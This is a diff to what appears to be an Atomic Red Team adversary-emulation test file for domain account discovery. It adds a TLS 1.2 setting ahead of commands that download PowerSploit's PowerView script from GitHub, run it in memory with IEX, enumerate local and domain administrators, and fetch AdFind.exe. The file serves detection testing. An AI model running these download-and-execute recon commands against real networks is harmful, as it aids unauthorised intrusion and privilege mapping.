@@ -53,6 +53,7 @@ atomic_tests:
   - windows
   executor:
     command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
     name: powershell
 - name: Find local admins on all machines in domain (PowerView)
@@ -63,6 +64,7 @@ atomic_tests:
   - windows
   executor:
     command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
     name: powershell
 - name: Find Local Admins via Group Policy (PowerView)
@@ -77,7 +79,9 @@ atomic_tests:
       type: Path
       default: $env:COMPUTERNAME
   executor:
-    command: "IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
+    command: | 
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose"
     name: powershell
 - name: Enumerate Users Not Requiring Pre Auth (ASRepRoast)
   auto_generated_guid: 870ba71e-6858-4f6d-895c-bb6237f6121b
@@ -123,6 +127,7 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
     get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe" -OutFile #{adfind_path}
   executor:
     command: |
